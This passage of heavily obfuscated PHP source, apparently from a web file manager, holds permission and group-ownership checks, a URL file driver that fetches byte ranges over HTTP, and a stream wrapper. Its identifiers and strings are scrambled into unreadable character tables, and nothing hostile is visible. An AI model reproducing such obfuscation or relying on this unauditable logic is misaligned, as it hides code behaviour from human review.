$ìÇÁâ±¤->parentLevelArray($¬»Ô¢…¹[$Øéëıø»[549]]); $ëæÅç‡ = array_merge($ëæÅç‡, $Ó‹úÙ); } $ëæÅç‡ = array_values(array_unique($ëæÅç‡)); foreach ($ëæÅç‡ as $É×”¦Í) { $¬»Ô¢…¹ = $î‡®ı•à->getInfo($É×”¦Í); $Í„öˆ·Ş[] = $¬»Ô¢…¹[$Øéëıø»[97]][$Øéëıø»[440]]; $†‰üâŞ[$É×”¦Í] = $¬»Ô¢…¹[$Øéëıø»[97]][$Øéëıø»[440]]; $Á­¢Âˆ[$É×”¦Í] = $ìÇÁâ±¤->parentLevelArray($¬»Ô¢…¹[$Øéëıø»[549]]); } foreach ($£äºÒ­á as $–ÜÒÉò => $ìä¯åú×) { $¿˜¤Â½¸ = $‘©Ù¾[$–ÜÒÉò]; if (!$¿˜¤Â½¸ || !$†‰üâŞ[$¿˜¤Â½¸]) { continue; } $ØÌš”£ö = array(); foreach ($Á­¢Âˆ[$¿˜¤Â½¸] as $É×”¦Í) { $ØÌš”£ö[] = $†‰üâŞ[$É×”¦Í]; } $£äºÒ­á[$–ÜÒÉò] = array_merge($ØÌš”£ö, $ìä¯åú×); } $Í„öˆ·Ş = array_values(array_unique($Í„öˆ·Ş)); $ßØ×Œ = array($Øéëıø»[2051] => $Í„öˆ·Ş, $Øéëıø»[2052] => $£äºÒ­á); $ÍÁÜ¥ö÷[$ä€·ïŒ÷] = $ßØ×Œ; return $ßØ×Œ; } private function makeSourceAuth($ı¦€Áëê, $¿¯¨û•, $Ê´ª×× = false) { $Ğì¤öÄ =& $_SERVER[¹òÍ›æş]; $õç·•¬Ê = $Ğì¤öÄ[98]; $øïÓ–Ÿ¥ = $ı¦€Áëê[$Ğì¤öÄ[534]]; $¢õ™…‘‹ = $ı¦€Áëê[$Ğì¤öÄ[449]] == SourceModel::TYPE_GROUP; $Óî÷ƒ°“ = $¢õ™…‘‹ ? $this->groupRootAuth($øïÓ–Ÿ¥, $Ê´ª××) : !1; if ($Óî÷ƒ°“ && Model($Ğì¤öÄ[536])->authCheckAction($Óî÷ƒ°“[$Ğì¤öÄ[451]], $Ğì¤öÄ[1880])) { return $this->groupAuthInfo($Óî÷ƒ°“, $øïÓ–Ÿ¥); } $ÜµÚæš = Model($Ğì¤öÄ[1360])->parentLevelArray($ı¦€Áëê[$Ğì¤öÄ[549]]); $ÜµÚæš = array_merge(array($ı¦€Áëê[$Ğì¤öÄ[440]]), array_reverse($ÜµÚæš)); $ÎÆÚö³³ = !1; foreach ($ÜµÚæš as $‚÷ıÏè½) { if (!isset($¿¯¨û•[$‚÷ıÏè½])) { continue; } $Ç¨…¶‡Â = $this->authMake($¿¯¨û•[$‚÷ıÏè½], $Ê´ª××); if ($Ç¨…¶‡Â[$Ğì¤öÄ[505]]) { $ÎÆÚö³³ = $Ç¨…¶‡Â; break; } } if (!$¢õ™…‘‹) { return $ÎÆÚö³³; } if (!$ÎÆÚö³³ && $Óî÷ƒ°“) { $ÎÆÚö³³ = $this->groupAuthInfo($Óî÷ƒ°“, $øïÓ–Ÿ¥); } if (!$ÎÆÚö³³) { $¯ãç¼Ö¼ = Model($Ğì¤öÄ[550])->getInfo($øïÓ–Ÿ¥); $åÆÉÏ›û = explode($Ğì¤öÄ[50], trim($¯ãç¼Ö¼[$Ğì¤öÄ[549]], $Ğì¤öÄ[50])); $åÆÉÏ›û = array_reverse($åÆÉÏ›û); foreach ($åÆÉÏ›û as $Ñ÷¤ïÉ›) { if ($Ñ÷¤ïÉ› == $Ğì¤öÄ[208] || $Ñ÷¤ïÉ› == $õç·•¬Ê) { continue; } $š‹¾Ê® = $this->groupRootAuth($Ñ÷¤ïÉ›, $Ê´ª××); if (!$š‹¾Ê®) { continue; } $ÎÆÚö³³ = $this->groupAuthInfo($š‹¾Ê®, $Ñ÷¤ïÉ›); break; } } if (!$ÎÆÚö³³ || $ÎÆÚö³³[$Ğì¤öÄ[452]] <= 0) { $×Ş¸°ÖÆ = $this->authDeepCheck($ı¦€Áëê[$Ğì¤öÄ[440]], $Ê´ª××); if ($×Ş¸°ÖÆ) { $ÎÆÚö³³ = $×Ş¸°ÖÆ; } } return $ÎÆÚö³³; } private function userIsRoot($“‡ú¼ = false) { $Ñ¾™†… =& $_SERVER[¹òÍ›æş]; if (!$“‡ú¼ && _get($GLOBALS, $Ñ¾™†…[532])) { return !0; } $•İÛ’¢Ô = Model($Ñ¾™†…[563])->getInfo($“‡ú¼); $ÁÎ¤ˆı… = Model($Ñ¾™†…[2060])->listData($•İÛ’¢Ô[$Ñ¾™†…[1550]]); if ($ÁÎ¤ˆı… && $ÁÎ¤ˆı…[$Ñ¾™†…[540]][$Ñ¾™†…[2061]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ı©Ó¡ğ·) { $ø–öòÆ¶ =& $_SERVER[¹òÍ›æş]; $ÛĞ‘˜ô² = Model($ø–öòÆ¶[1360]); $¿è÷‹ŞÆ = $ÛĞ‘˜ô²->sourceInfo($ı©Ó¡ğ·); if (!$¿è÷‹ŞÆ) { return !1; } $ÛĞ‘˜ô²->groupPathDisplay($¿è÷‹ŞÆ); $´ó±™±Í = array($¿è÷‹ŞÆ); $´ó±™±Í = $ÛĞ‘˜ô²->_listAppendPath($´ó±™±Í); $¿è÷‹ŞÆ = $´ó±™±Í[0]; $ıšÓÏË = $¿è÷‹ŞÆ[$ø–öòÆ¶[547]]; if (isset($¿è÷‹ŞÆ[$ø–öòÆ¶[555]])) { $§–ĞÑ©• = explode($ø–öòÆ¶[8], trim($¿è÷‹ŞÆ[$ø–öòÆ¶[547]], $ø–öòÆ¶[8])); array_shift($§–ĞÑ©•); $ıšÓÏË = $¿è÷‹ŞÆ[$ø–öòÆ¶[553]] . $ø–öòÆ¶[2062] . implode($ø–öòÆ¶[8], $§–ĞÑ©•); } return array($ø–öòÆ¶[458] => $¿è÷‹ŞÆ[$ø–öòÆ¶[32]], $ø–öòÆ¶[94] => KodIO::make($¿è÷‹ŞÆ[$ø–öòÆ¶[440]]), $ø–öòÆ¶[2063] => $ıšÓÏË); } private function groupAuthInfo($‘İê«ûô, $´„¸õ¹Õ) { $°µ¯“Š— =& $_SERVER[¹òÍ›æş]; $……•è² = Model($°µ¯“Š—[550])->getInfo($´„¸õ¹Õ); return array($°µ¯“Š—[2064] => intval($‘İê«ûô[$°µ¯“Š—[451]]), $°µ¯“Š—[2048] => $‘İê«ûô, $°µ¯“Š—[2065] => LNG($°µ¯“Š—[2066]), $°µ¯“Š—[2057] => array($°µ¯“Š—[458] => $……•è²[$°µ¯“Š—[32]], $°µ¯“Š—[94] => KodIO::make($……•è²[$°µ¯“Š—[97]][$°µ¯“Š—[440]]), $°µ¯“Š—[2063] => $……•è²[$°µ¯“Š—[554]])); } protected function groupRootAuth($ÖÄº§í‹, $ªÕü¬Š = false) { $½ùŠÄÕ =& $_SERVER[¹òÍ›æş]; $ªÕü¬Š = $ªÕü¬Š ? $ªÕü¬Š : USER_ID; $§…«óùù = $ªÕü¬Š . $½ùŠÄÕ[2067] . $ÖÄº§í‹; static $ÁáÑö = array(); if (isset($ÁáÑö[$§…«óùù])) { return $ÁáÑö[$§…«óùù]; } $²üàê£ı = Model($½ùŠÄÕ[550])->getInfo($ÖÄº§í‹); $ï–ò‹ïş = $this->userGroupList($ªÕü¬Š); $ÅöÏ¢¦Õ = isset($ï–ò‹ïş[$ÖÄº§í‹]) ? $ï–ò‹ïş[$ÖÄº§í‹][$½ùŠÄÕ[451]] : !1; if ($ÅöÏ¢¦Õ && Model($½ùŠÄÕ[536])->authCheckAction($ÅöÏ¢¦Õ[$½ùŠÄÕ[451]], $½ùŠÄÕ[1880])) { $ÁáÑö[$§…«óùù] = $ÅöÏ¢¦Õ; return $ÅöÏ¢¦Õ; } $–÷÷Ó°ª = $this->sourceAuthSelect($²üàê£ı[$½ùŠÄÕ[97]][$½ùŠÄÕ[440]]); $õ¶¨¿¼µ = $–÷÷Ó°ª ? $this->authMake($–÷÷Ó°ª, $ªÕü¬Š) : !1; $ÂØÌƒ“‡ = $õ¶¨¿¼µ ? $õ¶¨¿¼µ[$½ùŠÄÕ[505]] : !1; $ÁáÑö[$§…«óùù] = $ÂØÌƒ“‡ ? $ÂØÌƒ“‡ : $ÅöÏ¢¦Õ; return $ÁáÑö[$§…«óùù]; } public function authOwnerApply($êÍšı²) { $¹ì£ÓÕĞ =& $_SERVER[¹òÍ›æş]; if (empty($êÍšı²[$¹ì£ÓÕĞ[451]]) || isset($êÍšı²[$¹ì£ÓÕĞ[2068]]) && $êÍšı²[$¹ì£ÓÕĞ[2068]]) { return $êÍšı²; } if (AuthModel::authCheckRoot($êÍšı²[$¹ì£ÓÕĞ[451]][$¹ì£ÓÕĞ[452]])) { return $êÍšı²; } $àÜ‹ˆàú = Model($¹ì£ÓÕĞ[1360])->parentLevelArray($êÍšı²[$¹ì£ÓÕĞ[549]]); $àÜ‹ˆàú = array_merge(array($êÍšı²[$¹ì£ÓÕĞ[440]]), array_reverse($àÜ‹ˆàú)); $«¶µİÅ = $this->sourceAuthSelect($àÜ‹ˆàú); $§‡ôšŠŞ = array(); $ùú‡Ì¡µ = array(); foreach ($«¶µİÅ as $åäŸ’ˆº => $ûÑ¾Ñ÷×) { $ÕÁÔ·í = $this->authFolderOwnerUser($ûÑ¾Ñ÷×); $§‡ôšŠŞ[$åäŸ’ˆº] = $ÕÁÔ·í; $ùú‡Ì¡µ = array_merge($ùú‡Ì¡µ, $ÕÁÔ·í[$¹ì£ÓÕĞ[628]]); if ($ÕÁÔ·í[$¹ì£ÓÕĞ[2069]]) { break; } } if (count($ùú‡Ì¡µ) == 0) { $ùú‡Ì¡µ = $this->authFolderOwnerGroup($êÍšı²[$¹ì£ÓÕĞ[534]]); } $ùú‡Ì¡µ = array_unique($ùú‡Ì¡µ); if (AuthModel::authCheckRoot($êÍšı²[$¹ì£ÓÕĞ[451]][$¹ì£ÓÕĞ[452]])) { $ùú‡Ì¡µ[] = USER_ID; } $êÍšı²[$¹ì£ÓÕĞ[451]][$¹ì£ÓÕĞ[2070]] = Model($¹ì£ÓÕĞ[542])->userListInfo($ùú‡Ì¡µ); return $êÍšı²; } private function authFolderOwnerGroup($şğàĞä›) { $ïŸ™ä”¼ =& $_SERVER[¹òÍ›æş]; $ï¯‹ÌÒ¬ = Model($ïŸ™ä”¼[1949])->where(array($ïŸ™ä”¼[1859] => $şğàĞä›))->select(); $æ÷õ¶Ò¦ = array(); if (!$ï¯‹ÌÒ¬) { return $æ÷õ¶Ò¦; } foreach ($ï¯‹ÌÒ¬ as $ãæË°ï•) { $ºı´´°º = $this->authInfo($ãæË°ï•); if (AuthModel::authCheckRoot($ºı´´°º[$ïŸ™ä”¼[451]])) { $æ÷õ¶Ò¦[] = $ãæË°ï•[$ïŸ™ä”¼[1669]]; } } return $æ÷õ¶Ò¦; } private function authFolderOwnerUser($²ÉÉøÊ°) { $¡Ç­Òà– =& $_SERVER[¹òÍ›æş]; $ªı¤ùÜê = array(); $ãÏ¶¹Á¯ = !1; foreach ($²ÉÉøÊ° as $È»ÔÛª) { $Õ³±šó = $this->authInfo($È»ÔÛª); if ($È»ÔÛª[$¡Ç­Òà–[534]] == $¡Ç­Òà–[208]) { $ãÏ¶¹Á¯ = !0; } if ($È»ÔÛª[$¡Ç­Òà–[449]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Õ³±šó[$¡Ç­Òà–[451]])) { $ªı¤ùÜê[] = $È»ÔÛª[$¡Ç­Òà–[534]]; } } } return array($¡Ç­Òà–[628] => $ªı¤ùÜê, $¡Ç­Òà–[2069] => $ãÏ¶¹Á¯); } public function authMake($»Å‹¢‰ó, $šÒ˜¬íò = false) { $É¦¼’ä¼ =& $_SERVER[¹òÍ›æş]; $úÎ¶ÙÎ = $this->authArrayCheck($»Å‹¢‰ó, $šÒ˜¬íò); if ($úÎ¶ÙÎ[$É¦¼’ä¼[2071]]) { $úÎ¶ÙÎ[$É¦¼’ä¼[2071]] = $this->sourceAuthInfo($úÎ¶ÙÎ[$É¦¼’ä¼[2071]]); } return $úÎ¶ÙÎ; } public function authArrayCheck($‹¿§Ü²é, $æÆÆØŒ = false) { $îæ‹÷ÜŒ =& $_SERVER[¹òÍ›æş]; if (!$‹¿§Ü²é) { return array($îæ‹÷ÜŒ[452] => 0, $îæ‹÷ÜŒ[505] => !1); } $æÆÆØŒ = $æÆÆØŒ ? $æÆÆØŒ : USER_ID; $Ş™„ÃÌÄ = 0; $¶¹âú›à = 0; $ÉÚ¥Î¥  = 0; $­®áÖ½¬ = 0; $¢ÄÎ§¿÷ = 0; $ÂŠí‹²ó = 0; $²£¢ÒÜë = 1000; $ÕÙÔ¥ûË = 0; $ÔŸÛœ‘˜ = 0; $ªüåèÍ  = 0; $§Í­àñ‰ = 0; $î»ççË„ = array($îæ‹÷ÜŒ[440] => 0); foreach ($‹¿§Ü²é as $î»ççË„) { $ò„¼Ùçª = $this->authInfo($î»ççË„); if (!$ò„¼Ùçª) { continue; } $ÉÂ”ùµÁ = $î»ççË„[$îæ‹÷ÜŒ[534]]; $¢›ŞÓÌ© = intval($ò„¼Ùçª[$îæ‹÷ÜŒ[451]]); if ($î»ççË„[$îæ‹÷ÜŒ[449]] == SourceModel::TYPE_USER && $ÉÂ”ùµÁ == $æÆÆØŒ) { $Ş™„ÃÌÄ = !0; $ÉÚ¥Î¥  = $ò„¼Ùçª; $¶¹âú›à = $¢›ŞÓÌ©; } else { if ($î»ççË„[$îæ‹÷ÜŒ[449]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ÉÂ”ùµÁ, $æÆÆØŒ)) { $­®áÖ½¬ = !0; $…ãøàÀ = $this->groupStepToUserGroup($ÉÂ”ùµÁ, $æÆÆØŒ); if ($…ãøàÀ < $²£¢ÒÜë) { $²£¢ÒÜë = $…ãøàÀ; $¢ÄÎ§¿÷ = $¢›ŞÓÌ©; $ÂŠí‹²ó = $ò„¼Ùçª; $ÕÙÔ¥ûË = $ÉÂ”ùµÁ; } if ($…ãøàÀ == $²£¢ÒÜë && $¢›ŞÓÌ© >= $¢ÄÎ§¿÷) { $¢ÄÎ§¿÷ = $¢›ŞÓÌ©; $ÂŠí‹²ó = $ò„¼Ùçª; $ÕÙÔ¥ûË = $ÉÂ”ùµÁ; } } else { if ($ÉÂ”ùµÁ == $îæ‹÷ÜŒ[208]) { $ÔŸÛœ‘˜ = !0; $§Í­àñ‰ = $ò„¼Ùçª; $ªüåèÍ  = $¢›ŞÓÌ©; } } } } if ($Ş™„ÃÌÄ) { $§“¯¢ì€ = $¶¹âú›à; $ò„¼Ùçª = $ÉÚ¥Î¥ ; $¤€ø¡÷Ï = LNG($îæ‹÷ÜŒ[2072]); } else { if ($­®áÖ½¬) { $§“¯¢ì€ = $¢ÄÎ§¿÷; $ò„¼Ùçª = $ÂŠí‹²ó; $ç•¦³· = Model($îæ‹÷ÜŒ[550])->getInfo($ÕÙÔ¥ûË); $¤€ø¡÷Ï = $îæ‹÷ÜŒ[172] . $ç•¦³·[$îæ‹÷ÜŒ[554]] . $îæ‹÷ÜŒ[2073] . LNG($îæ‹÷ÜŒ[2074]); } else { if ($ÔŸÛœ‘˜) { $§“¯¢ì€ = $ªüåèÍ ; $ò„¼Ùçª = $§Í­àñ‰; $¤€ø¡÷Ï = LNG($îæ‹÷ÜŒ[2045]); } else { $§“¯¢ì€ = 0; $ò„¼Ùçª = !1; $¤€ø¡÷Ï = $îæ‹÷ÜŒ[12]; } } } $ºÈ¼ºÊå = array($îæ‹÷ÜŒ[2064] => intval($§“¯¢ì€), $îæ‹÷ÜŒ[2048] => $ò„¼Ùçª, $îæ‹÷ÜŒ[2065] => $¤€ø¡÷Ï, $îæ‹÷ÜŒ[2057] => $î»ççË„[$îæ‹÷ÜŒ[440]]); return $ºÈ¼ºÊå; } private function groupContainUser($´ÄÕÙªÙ, $÷ğÇ†ú = false) { return in_array($´ÄÕÙªÙ, $this->userGroupParents($÷ğÇ†ú)); } private function groupStepToUserGroup($Á™Òç€É, $í¥–Èó¢ = false) { $ã’¾¡“Ø =& $_SERVER[¹òÍ›æş]; $„àöõ‡ = $this->userGroupList($í¥–Èó¢); $ô¥ŸÔóÁ = 1000; $ãÀî¥…ş = $GLOBALS[$ã’¾¡“Ø[6]][$ã’¾¡“Ø[99]][$ã’¾¡“Ø[1962]] == 1; $˜áäõÙ = $ãÀî¥…ş ? 3 : 2; foreach ($„àöõ‡ as $“Šâ¿³«) { if ($“Šâ¿³«[$ã’¾¡“Ø[1859]] == $Á™Òç€É) { return 0; } $ÕÄ–û¥° = explode($ã’¾¡“Ø[50], trim($“Šâ¿³«[$ã’¾¡“Ø[549]], $ã’¾¡“Ø[50])); if ($ÕÄ–û¥°[0] == $ã’¾¡“Ø[208] && count($ÕÄ–û¥°) > $˜áäõÙ) { $ÂÍ©ùÄŒ = array_reverse(array_slice($ÕÄ–û¥°, $˜áäõÙ)); $áúÒÉ¨ = array_search($Á™Òç€É, $ÂÍ©ùÄŒ); if ($áúÒÉ¨ !== !1 && $áúÒÉ¨ + 1 <= $ô¥ŸÔóÁ) { $ô¥ŸÔóÁ = $áúÒÉ¨ + 1; } } } return $ô¥ŸÔóÁ; } private function userGroupList($í¥¿»Êó = false) { $İªÕË…É =& $_SERVER[¹òÍ›æş]; static $³Ÿ¾Ç¼­ = array(); if (isset($³Ÿ¾Ç¼­[$í¥¿»Êó])) { return $³Ÿ¾Ç¼­[$í¥¿»Êó]; } $ÕÒà‡Çã = Model($İªÕË…É[563])->getInfo($í¥¿»Êó); $³Ÿ¾Ç¼­[$í¥¿»Êó] = array_to_keyvalue($ÕÒà‡Çã[$İªÕË…É[2046]], $İªÕË…É[1859]); return $³Ÿ¾Ç¼­[$í¥¿»Êó]; } public function userGroupParents($çä˜ª¹) { $Ûå¯©¡æ =& $_SERVER[¹òÍ›æş]; static $›Ãä©ô¿ = array(); $çä˜ª¹ = $çä˜ª¹ ? $çä˜ª¹ : USER_ID; if (isset($›Ãä©ô¿[$çä˜ª¹])) { return $›Ãä©ô¿[$çä˜ª¹]; } $ªÄŞ¯ÖÈ = $this->userGroupList($çä˜ª¹); $øìµ¡¹ = array(); $ŸƒºÎÒ = $GLOBALS[$Ûå¯©¡æ[6]][$Ûå¯©¡æ[99]][$Ûå¯©¡æ[1962]] == 1; $Ãî©ü£¡ = $ŸƒºÎÒ ? 3 : 2; foreach ($ªÄŞ¯ÖÈ as $ùØé°¦¨) { $Ìä¥÷…š = array($ùØé°¦¨[$Ûå¯©¡æ[1859]]); $ïóëÕ» = explode($Ûå¯©¡æ[50], trim($ùØé°¦¨[$Ûå¯©¡æ[549]], $Ûå¯©¡æ[50])); if ($ïóëÕ»[0] == $Ûå¯©¡æ[208] && count($ïóëÕ») > $Ãî©ü£¡) { $ñ’íÔîÇ = array_slice($ïóëÕ», $Ãî©ü£¡); $Ìä¥÷…š = array_merge($Ìä¥÷…š, array_reverse($ñ’íÔîÇ)); } $øìµ¡¹ = array_merge($øìµ¡¹, $Ìä¥÷…š); } $›Ãä©ô¿[$çä˜ª¹] = array_unique($øìµ¡¹); return $›Ãä©ô¿[$çä˜ª¹]; } public function authTargetInfoMake($ë××ë–Œ) { $Š—Ä”¯ö =& $_SERVER[¹òÍ›æş]; $ò¶¼è¯Ç = array(); $¡ ÏŞÍ = array(); foreach ($ë××ë–Œ as $ôêßˆ‹²) { if ($ôêßˆ‹²[$Š—Ä”¯ö[449]] == SourceModel::TYPE_USER) { $ò¶¼è¯Ç[] = intval($ôêßˆ‹²[$Š—Ä”¯ö[534]]); } else { if ($ôêßˆ‹²[$Š—Ä”¯ö[449]] == SourceModel::TYPE_GROUP) { $¡ ÏŞÍ[] = intval($ôêßˆ‹²[$Š—Ä”¯ö[534]]); } } } if ($ò¶¼è¯Ç) { $ò¶¼è¯Ç = Model($Š—Ä”¯ö[542])->userListInfo($ò¶¼è¯Ç); } if ($¡ ÏŞÍ) { $ ˜ÊğÙŒ = array($Š—Ä”¯ö[1947] => array($Š—Ä”¯ö[456], $¡ ÏŞÍ)); $¡ ÏŞÍ = Model($Š—Ä”¯ö[550])->field($Š—Ä”¯ö[2075])->where($ ˜ÊğÙŒ)->select(); $¡ ÏŞÍ = array_to_keyvalue($¡ ÏŞÍ, $Š—Ä”¯ö[1859]); } return array($Š—Ä”¯ö[2076] => $ò¶¼è¯Ç, $Š—Ä”¯ö[2077] => $¡ ÏŞÍ); } public function authInfo($±Šû¼ô·) { $†ñØ‡á¢ =& $_SERVER[¹òÍ›æş]; if ($±Šû¼ô·[$†ñØ‡á¢[1963]]) { $¾†³‚î = Model($†ñØ‡á¢[536])->listData($±Šû¼ô·[$†ñØ‡á¢[1963]]); if (!$¾†³‚î) { return !1; $ĞÓ—ØÈ = Model($†ñØ‡á¢[536])->listData(); $¡¦ì¯úÄ = array_filter_by_field($ĞÓ—ØÈ, $†ñØ‡á¢[451], $†ñØ‡á¢[208]); return $¡¦ì¯úÄ; } $æË×¢û‹ = array_field_key($¾†³‚î, array($†ñØ‡á¢[437], $†ñØ‡á¢[32], $†ñØ‡á¢[451], $†ñØ‡á¢[1882], $†ñØ‡á¢[1883])); $æË×¢û‹[$†ñØ‡á¢[2078]] = $±Šû¼ô·; return $æË×¢û‹; } else { return array($†ñØ‡á¢[457] => 0, $†ñØ‡á¢[1865] => $±Šû¼ô·[$†ñØ‡á¢[2023]], $†ñØ‡á¢[458] => $†ñØ‡á¢[12], $†ñØ‡á¢[1882] => $†ñØ‡á¢[2079]); } } } goto C‚æ¤„ñ‰Î; EÓĞ¥·†Ò: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Ş¹ÜÄšü = false) { } public function exist($Ù¿€Ùà–) { $¡àÃ¯™ğ = $this->info($Ù¿€Ùà–); return $¡àÃ¯™ğ[$_SERVER[¹òÍ›æş][212]]; } public function isFile($ Ÿø«ò) { $æÃé×÷ = $this->info($ Ÿø«ò); return $æÃé×÷[$_SERVER[¹òÍ›æş][212]]; } public function isFolder($ŞÓÚÙ¬) { return !1; } public function size($–óÉµÎ€) { $ü€Şİá = $this->info($–óÉµÎ€); return $ü€Şİá[$_SERVER[¹òÍ›æş][86]]; } public function info($•¶ÄóÓ) { return $this->infoParse($•¶ÄóÓ); } public function infoAuth($áè¡ğÏÒ) { return $this->infoParse($áè¡ğÏÒ); } public function infoWithChildren($œñéå’ğ) { return $this->infoParse($œñéå’ğ); } public function infoFull($’‚ùï¸Ç) { return $this->infoParse($’‚ùï¸Ç); } private function infoParse($£Æ²ŠÂ¡) { $Š×îêğ† =& $_SERVER[¹òÍ›æş]; $áı‚îª¯ = $this->header($£Æ²ŠÂ¡); if (!$áı‚îª¯ || !$áı‚îª¯[$Š×îêğ†[780]]) { return !1; } $ãá¾âÚÁ = _get($áı‚îª¯, $Š×îêğ†[375], 0); $¼›€Æà£ = array($Š×îêğ†[32] => $áı‚îª¯[$Š×îêğ†[32]], $Š×îêğ†[94] => $£Æ²ŠÂ¡, $Š×îêğ†[33] => $Š×îêğ†[210], $Š×îêğ†[86] => intval($ãá¾âÚÁ), $Š×îêğ†[184] => get_path_ext($áı‚îª¯[$Š×îêğ†[32]]), $Š×îêğ†[1391] => $ãá¾âÚÁ > 0 && $áı‚îª¯[$Š×îêğ†[1513]], $Š×îêğ†[1392] => !1); return $¼›€Æà£; } private function header($ä§±ÔÂ) { $¼½ôÃ€¯ =& $_SERVER[¹òÍ›æş]; if (isset(self::$_cacheHeader[$ä§±ÔÂ])) { return self::$_cacheHeader[$ä§±ÔÂ]; } $©å¶øÍ = isset($GLOBALS[$¼½ôÃ€¯[1514]]) ? $GLOBALS[$¼½ôÃ€¯[1514]] : !1; $GLOBALS[$¼½ôÃ€¯[1514]] = !0; self::$_cacheHeader[$ä§±ÔÂ] = url_header($ä§±ÔÂ); $GLOBALS[$¼½ôÃ€¯[1514]] = $©å¶øÍ; return self::$_cacheHeader[$ä§±ÔÂ]; } public function hashSimple($ı’¶Ä¨ä, $ã¹±•®¾ = false) { $İÍµÅá =& $_SERVER[¹òÍ›æş]; $–¶Ú¥õ¢ = $this->info($ı’¶Ä¨ä); if (!$–¶Ú¥õ¢ || !$–¶Ú¥õ¢[$İÍµÅá[212]]) { return !1; } $Ñıœœæº = $–¶Ú¥õ¢[$İÍµÅá[86]]; $È’ = 200; $ş‡Ÿß— = 50; if ($Ñıœœæº <= $È’ * $ş‡Ÿß—) { return md5($this->fileSubstr($ı’¶Ä¨ä, 0, $Ñıœœæº)) . $Ñıœœæº; } $ËÔ´ú¸€ = intval($Ñıœœæº / $ş‡Ÿß—); $”ÕÏıõ = $İÍµÅá[12]; $±š‡¡Í = timeFloat(); $óÄ¥ÖÀÙ = 15; for ($ïÜ„ĞÒˆ = 0; $ïÜ„ĞÒˆ < $ş‡Ÿß—; $ïÜ„ĞÒˆ++) { if (timeFloat() - $±š‡¡Í > $óÄ¥ÖÀÙ) { return !1; } $Æ›ôó§Ş = $this->fileSubstr($ı’¶Ä¨ä, $ËÔ´ú¸€ * $ïÜ„ĞÒˆ, $È’); if (!$Æ›ôó§Ş) { return !1; } $”ÕÏıõ .= $Æ›ôó§Ş; } $”ÕÏıõ .= $this->fileSubstr($ı’¶Ä¨ä, $Ñıœœæº - $È’, $È’); return md5($”ÕÏıõ) . $Ñıœœæº; } public function getContent($’²Ş¯š×) { return $this->fileSubstr($’²Ş¯š×); } public function fileSubstr($àÈĞ¯©‡, $¥¬Ü†Ø = 0, $ƒæÇâå = -1) { $ÀîÚß—¸ =& $_SERVER[¹òÍ›æş]; $É¢ïŸÜ = $this->info($àÈĞ¯©‡); if (!$É¢ïŸÜ || !$É¢ïŸÜ[$ÀîÚß—¸[212]] && $É¢ïŸÜ[$ÀîÚß—¸[86]] > 1024 * 1024 * 10) { return !1; } if ($ƒæÇâå === -1) { $ƒæÇâå = $É¢ïŸÜ[$ÀîÚß—¸[86]]; } if ($ƒæÇâå == 0) { return $ÀîÚß—¸[12]; } $‰‡øÍæ½ = array($ÀîÚß—¸[1515] . $¥¬Ü†Ø . $ÀîÚß—¸[812] . ($¥¬Ü†Ø + $ƒæÇâå - 1)); $»œ–„×ä = url_request($àÈĞ¯©‡, $ÀîÚß—¸[240], !1, $‰‡øÍæ½, !1, !1, 30); return $»œ–„×ä[$ÀîÚß—¸[1229]] ? $»œ–„×ä[$ÀîÚß—¸[1229]] : $ÀîÚß—¸[12]; } public function download($½¼ª›•, $ÒÛ¦§…) { Downloader::start($½¼ª›•, $ÒÛ¦§…); return $ÒÛ¦§…; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Ïùèæ¥Á, $µú«¿ÒÚ = '') { $this->info = $this->info($Ïùèæ¥Á); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¹òÍ›æş][94]]; $this->pathOpen = $Ïùèæ¥Á; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Ïùèæ¥Á])) { self::$_chunkBuffer[$Ïùèæ¥Á] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($¶€¤öï¬) { $¦×ËÍÁ® = $this->fileSubstr($this->pose, $¶€¤öï¬); $this->pose += strlen($¦×ËÍÁ®); return $¦×ËÍÁ®; } public function stream_tell() { return $this->pose; } public function stream_seek($‘ØäéòÒ, $ê‘ó¢€Ø) { $½¹Ø‘¿Ğ =& $_SERVER[¹òÍ›æş]; if ($ê‘ó¢€Ø == SEEK_SET) { $this->pose = $‘ØäéòÒ; } else { if ($ê‘ó¢€Ø == SEEK_CUR) { $this->pose += $‘ØäéòÒ; } else { if ($ê‘ó¢€Ø == SEEK_END) { $this->pose = $this->info[$½¹Ø‘¿Ğ[86]] + intval($‘ØäéòÒ); } } } if ($‘ØäéòÒ < 0) { $this->pose = $this->info[$½¹Ø‘¿Ğ[86]] + $‘ØäéòÒ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¹òÍ›æş][86]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÀÏë¼ğ, $À¦âõ²) { $ÂÇİ˜ª‘ =& $_SERVER[¹òÍ›æş]; $ñş°Ğ¶Û = $this->info($ÀÏë¼ğ); return array($ÂÇİ˜ª‘[1516] => 0, $ÂÇİ˜ª‘[1517] => 0, $ÂÇİ˜ª‘[16] => 32768 + 511, $ÂÇİ˜ª‘[1518] => 0, $ÂÇİ˜ª‘[1519] => 0, $ÂÇİ˜ª‘[1520] => 0, $ÂÇİ˜ª‘[1521] => 0, $ÂÇİ˜ª‘[86] => $ñş°Ğ¶Û[$ÂÇİ˜ª‘[86]], $ÂÇİ˜ª‘[1522] => $ñş°Ğ¶Û[$ÂÇİ˜ª‘[1390]], $ÂÇİ˜ª‘[1478] => $ñş°Ğ¶Û[$ÂÇİ˜ª‘[95]], $ÂÇİ˜ª‘[1477] => $ñş°Ğ¶Û[$ÂÇİ˜ª‘[211]], $ÂÇİ˜ª‘[1523] => 0, $ÂÇİ˜ª‘[1524] => 0); } static $fileInfo = array(); public function info($¤«ê’­ä) { $ÖéøÌÀû = $_SERVER[¹òÍ›æş][1525]; if (isset(self::$fileInfo[$¤«ê’­ä])) { return self::$fileInfo[$¤«ê’­ä]; } if (substr($¤«ê’­ä, 0, strlen($ÖéøÌÀû)) != $ÖéøÌÀû) { return !1; } self::$fileInfo[$¤«ê’­ä] = IO::info(substr($¤«ê’­ä, 